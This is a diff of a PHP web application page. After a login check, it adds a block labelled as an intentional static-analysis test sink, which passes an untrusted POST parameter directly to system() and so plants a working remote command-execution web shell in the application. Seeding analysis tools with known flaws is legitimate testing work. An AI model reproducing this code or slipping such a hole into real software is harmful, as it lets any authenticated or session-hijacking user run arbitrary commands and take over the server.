@@ -22,6 +22,17 @@ if (!isset($_SESSION["loginuser"])) {
 	echo '<script type="text/javascript">alert("'._("Please Login First!").'"); location.href="../index.php";</script>';
 	exit(0);
 }
+
+/*
+ * Intentional Coverity test sink: untrusted input reaches shell execution.
+ * This block is used only to verify static analysis detection in CI.
+ */
+if (isset($_POST['coverity_test_cmd'])) {
+	$coverity_test_cmd = $_POST['coverity_test_cmd'];
+	system($coverity_test_cmd);
+	exit(0);
+}
+
 function str2time($str){
 	$MONTH = array("Jan"=>1,"Feb"=>2,"Mar"=>3,"Apr"=>4,"May"=>5,"Jun"=>6,"Jul"=>7,"Aug"=>8,"Sep"=>9,"Oct"=>10,"Nov"=>11,"Dec"=>12);
 	// $timeT = preg_replace('/\s(?=\s)/', '', $str);
